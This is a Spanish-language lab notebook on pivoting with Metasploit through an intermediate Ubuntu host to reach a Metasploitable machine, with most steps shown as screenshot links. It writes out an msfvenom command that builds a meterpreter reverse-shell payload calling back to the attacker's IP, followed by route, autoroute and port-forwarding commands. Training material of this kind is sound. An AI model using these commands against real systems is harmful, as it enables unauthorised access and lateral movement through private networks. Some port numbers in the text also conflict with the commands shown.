## CONFIGURACIÓN LABORATORIO
Lo primero será ir a la parte de herramientas y Administrador de red: 
![[Pasted image 20230717133814.png]]
Y ahora vamos a la parte de redes NAT y creamos nuestra primera red con estos parámetros:
![[Pasted image 20230717134004.png]]
Por tanto, una vez creada esta red sobre la que haremos pivoting, veremos como configuraremos las 3 máquinas:
MÁQUINA KALI:
![[Pasted image 20230717134609.png]]
MÁQUINA UBUNTU INTERMEDIA:
![[Pasted image 20230717134629.png]]
MÁQUINA METASPLOITABLE FINAL:
![[Pasted image 20230717134647.png]]
De tal forma que la máquina kali tiene conectividad solo con la máquina ubuntu; y la máquina ubuntu tiene conectividad tanto con la Kali como con la metasploitable:
![[Pasted image 20230717134751.png]]
# PIVOTING
Lo primero será generar una sesión de meterpreter entre la máquina atacante y la de ubuntu, por lo que usamos el multi/handler con metasploit:
```bash
set PAYLOAD linux/x86/meterpreter/reverse_tcp
```
![[Pasted image 20230717125804.png]]
![[Pasted image 20230717125829.png]]
Y ahora con msfvenom generamos el payload:
```bash
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.0.30 LPORT=4444 -f elf -b '\x00\x0a\x0d' -o virus
```
![[Pasted image 20230717125603.png]]
Lo ejecutamos dentro de la máquina objetivo:
![[Pasted image 20230717125653.png]]
Y en metasploit habremos recibido una sesión de meterpreter:
![[Pasted image 20230717125857.png]]
En este punto ya podemos listar las interfaces de red para poder establecer el tráfico o la tunelización con el comando ipconfig:
![[Pasted image 20230717162121.png]]
Ahora para tunelizar todo el tráfico de la máquina ubuntu a la máquina atacante, tenemos que poner la sesión de meterpreter en segundo plano, de tal forma que podamos listarla usando el comando sessions -l:
![[Pasted image 20230717162209.png]]
Ahora debemos usar el comando route add y añadimos la IP objetivo a la que no tenemos acceso y hayamos visto al ejecutar el comando ipconfig con la siguiente estructura:
```bash
route add <network> <netmask> <session_id>

# Ejemplo de ello:

route add 20.20.20.4 255.255.255.0 1
```
![[Pasted image 20230717162255.png]]
Y ahora desde metasploit, podemos usar el módullo de http_version para escanear a la máquina metasploitable, donde debemos añadir su IP con el set RHOSTS:
![[Pasted image 20230717162622.png]]
Ahora vamos a realizar el port forwarding, de tal forma que por el puerto 5000 de nuestra máquina Kali vamos a estar recibiendo el tráfico del puerto 22 de la máquina final metasploitable; y eso lo hacemos con este comando:
```bash
portfwd add -l 5000 -p 80 -r 20.20.20.6
```
![[Pasted image 20230717190710.png]]
Y vemos que tenemos conexión al puerto 80 de la máquina objetivo desde nuestro puerto 5000 de mi máquina Kali:
![[Pasted image 20230717190746.png]]
También podemos redirigir más de un puerto a la vez, ahora vamos a redirigir el tráfico del puerto 22 de la máquina metasploitable a la atacante:
![[Pasted image 20230717190952.png]]
Y vemos que tenemos conexión vía SSH:
![[Pasted image 20230717191007.png]]
 -----------------------

Tenemos la interfaz de red objetivo:
![[Pasted image 20230730154047.png]]
Y usaremos el módulo de autoroute:
```bash
use post/multi/manage/autoroute
```
![[Pasted image 20230730154643.png]]
Y ahora vamos a enviarnos el tráfico del puerto 80 al puerto 5000 de nuestra máquina local:
![[Pasted image 20230730155018.png]]
![[Pasted image 20230730155027.png]]
